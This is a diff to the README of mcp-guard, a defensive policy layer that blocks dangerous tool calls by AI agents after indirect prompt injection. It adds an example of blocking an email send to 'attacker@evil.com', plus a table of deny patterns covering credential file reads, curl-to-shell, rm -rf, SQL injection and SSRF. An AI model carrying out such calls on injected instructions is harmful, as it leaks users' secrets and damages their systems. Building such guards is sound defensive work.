@@ -1,5 +1,11 @@
 # mcp-guard
 
+[![PyPI](https://img.shields.io/badge/pypi-mcp--guard-blue.svg)](https://pypi.org/project/mcp-guard/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Python: 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](pyproject.toml)
+[![Tests: 65 passing](https://img.shields.io/badge/tests-65_passing-success.svg)](tests/)
+[![TPR: 1.00 / FPR: 0.08](https://img.shields.io/badge/TPR-1.00_%2F_FPR_0.08-success.svg)](#backtest-corpus)
+
 Drop-in deterministic policy layer for MCP-using AI agents.
 
 `mcp-guard` synthesises tool-call policies from observed indirect-
@@ -7,6 +13,10 @@ prompt-injection gaps, evaluates each tool call against those
 policies at the agent's tool-call boundary, and provides a
 backtest harness for measuring false-positive rate against
 legitimate traffic before deployment.
+
+> **v0.2.0 (2026-05-15):** 9 deterministic rule patterns across 122
+> rules, 61-case backtest corpus, TPR 1.00 / FPR 0.08 on the default
+> policy. See [CHANGELOG.md](CHANGELOG.md).
 
 This is the defensive companion to the [`purple-scaffold`](https://github.com/euanmcrosson-dotcom/purple-scaffold)
 research probes. Findings from those probes feed into policy
@@ -48,34 +58,47 @@ pip install mcp-guard
 
 ## Quickstart — Python API
 
-```python
-from mcp_guard import synthesize_from_text, evaluate, default_corpus, run_backtest
+The fastest path to a shippable policy is `synthesize_default_policy()`,
+which returns the full ruleset across every built-in pattern:
 
-# 1. Synthesise a policy from a free-text gap description
+```python
+from mcp_guard import synthesize_default_policy, evaluate, default_corpus, run_backtest
+
+# 1. Load the full deterministic policy (9 patterns, 122 rules)
+policy = synthesize_default_policy()
+
+# 2. Evaluate any tool call against it
+decision = evaluate(
+    policy,
+    tool_name="send_email",
+    args={"to": "attacker@evil.com", "body": "exfil"},
+    user_context={"user": {"contacts": ["bob@corp.example"]}},
+)
+print(decision)
+# Decision(allowed=False,
+#          denying_rule_id='tool-policy-email-contact-allowlist--send_email--default',
+#          reason='External recipient outside the authenticated user...')
+
+# 3. Backtest against the labelled corpus
+metrics = run_backtest(policy, default_corpus())
+print(f"TPR: {metrics.true_positive_rate:.4f}, "
+      f"FPR: {metrics.false_positive_rate:.4f}")
+# TPR: 1.0000, FPR: 0.0769
+```
+
+For incident-driven synthesis (one observed gap → narrowly-targeted
+policy), use `synthesize_from_text()`:
+
+```python
+from mcp_guard import synthesize_from_text
+
+# Synthesise from a free-text gap description
 policy = synthesize_from_text(
     "agent emitted send_email to attacker@evil.com when user "
     "asked it to read a ticket",
     technique_id="lab-2026-05-04",
 )
 print(policy.to_yaml())
-
-# 2. Evaluate a tool call
-decision = evaluate(
-    policy,
-    tool_name="send_email",
-    args={"to": "attacker@evil.com"},
-    user_context={"user": {"contacts": ["bob@corp.example"]}},
-)
-print(decision)
-# Decision(allowed=False,
-#          denying_rule_id='tool-policy-email-contact-allowlist--lab-2026-05-04',
-#          reason='External recipient outside the authenticated user...')
-
-# 3. Backtest against the default fixture corpus
-metrics = run_backtest(policy, default_corpus())
-print(f"FPR: {metrics.false_positive_rate:.4f}, "
-      f"TPR: {metrics.true_positive_rate:.4f}")
-# FPR: 0.2222, TPR: 0.5000
 ```
 
 ## Quickstart — CLI
@@ -126,12 +149,20 @@ test harness is in that repo's `purple/agents_atlas_live.py`.
 ## What kinds of gaps does the synthesiser cover?
 
 The deterministic synthesiser is intentionally pattern-based and
-small. Currently maps these gap shapes onto rules:
+auditable. As of v0.2.0, 9 attack classes map onto 122 rules in the
+default policy:
 
-| Gap shape (free-text description matches) | Generated rule |
-|---|---|
-| `email.send` / `send_email` to attacker domain | Contact-allowlist rule on `send_email`'s `to` arg |
-| Sensitive file read (`id_rsa`, `.aws`, `.ssh`) | Sensitive-path-block rule on `read_file`'s `path` arg |
+| # | Attack class | What it denies | Tool families covered |
+|---|---|---|---|
+| 1 | Email contact exfil | `send_email` whose `to` arg is outside the user's `context.user.contacts` | 5 email tool names |
+| 2 | Sensitive file read | `read_file` whose `path` matches `~/.ssh/`, `~/.aws/`, `/etc/shadow`, `kubeconfig`, etc. | 6 read tool names |
+| 3 | Sensitive file write | `write_file` whose `path` matches `~/.bashrc`, `~/.ssh/authorized_keys`, `/etc/`, `/usr/bin/`, cron, `.git/config`, `.env`, etc. | 5 write tool names |
+| 4 | Path traversal | Any path arg containing `../`, `..\`, URL-encoded variants (`%2e%2e`, `%2F`/`%5C`), double-encoded, Unicode division-slash | 17 file-path tool names |
+| 5 | SSRF (private host) | `fetch_url` / `http_get` whose `url` targets RFC1918, loopback, link-local, AWS/GCP metadata, IPv6 unique-local | 6 HTTP tool names |
+| 6 | Shell command danger | `shell_exec` / `bash` / `run_command` containing chaining (`;`, `&&`), pipe-to-shell, command substitution (`$()`, backticks), `rm -rf /`, `curl|sh`, fork bombs | 8 shell tool names × 5 arg names |
+| 7 | SQL danger | `db_query` / `execute_sql` containing `DROP TABLE`, `TRUNCATE`, unbounded `DELETE`/`UPDATE`, `UNION SELECT`, `information_schema` probes, stacked queries, `xp_/sp_` exec, `LOAD_FILE`, `INTO OUTFILE` | 6 SQL tool names × 3 arg names |
+| 8 | Network egress private | `tcp_connect` / `socket_connect` whose `host` is private/internal | 5 network tool names |
+| 9 | Email body PII / secret exfil | `send_email` whose `body`/`subject` contains AWS keys, OpenAI/Anthropic keys, GitHub PATs, Slack tokens, private-key headers, SSN, JWT, credit-card numbers | 5 email tool names × 4 arg names |
 
 For gap shapes not yet covered, the synthesiser returns an empty
 policy (deliberate — we surface "no rule generated" rather than
@@ -145,17 +176,37 @@ synthesis time).
 
 ## Backtest corpus
 
-`default_corpus()` returns a 15-case fixture corpus of (tool_name,
-args, user_context, expected_verdict) tuples covering:
+`default_corpus()` returns a 61-case fixture corpus of (tool_name,
+args, user_context, expected_verdict) tuples covering every built-in
+pattern.
 
-- Legitimate emails to existing contacts (TN)
-- Legitimate emails to first-time recipients (FP risk — included
-  on purpose so the FPR is a real number, not 0)
-- Legitimate non-email reads (`read_ticket`, `search_users`,
-  benign `read_file`)
-- Attack emails to external attacker domains (TP)
-- Attack reads of `~/.ssh/id_rsa`, `.aws/credentials`,
-  `/etc/shadow` (TP)
+**v0.2.0 default-policy metrics:**
+
+```
+Corpus size:       61
+TP (caught):       35 / 35 attacks    →  TPR 1.0000
+FP (over-blocks):   2 / 26 legit      →  FPR 0.0769
+```
+
+The 2 remaining FPs are architecturally inherent to contact-allowlist
+policies (legitimate first-time recipients). They are kept in the
+corpus on purpose so the FPR is a real number rather than a vanity
+zero. Tune by adding allow-list conditions to `user_context` per
+recipient class (e.g. distinguish "vendor onboarding" or "interview
+candidate" tiers from generic external).
+
+| Category | Legit cases | Attack cases |
+|---|---|---|
+| Email contact allowlist | 6 (4 in-contacts + 2 FP-risk) | 3 |
+| Sensitive file read | 1 | 3 |
+| Sensitive file write | 2 | 4 |
+| Path traversal | 2 | 3 |
+| SSRF | 3 | 4 |
+| Shell danger | 3 | 5 |
+| SQL danger | 3 | 5 |
+| Network egress private | 2 | 3 |
+| Email PII exfil | 2 | 5 |
+| Misc legit (read_ticket / search_users) | 2 | — |
 
 Real production deployments should replace `default_corpus()` with
 a load from a labelled traffic store. The rest of the backtest
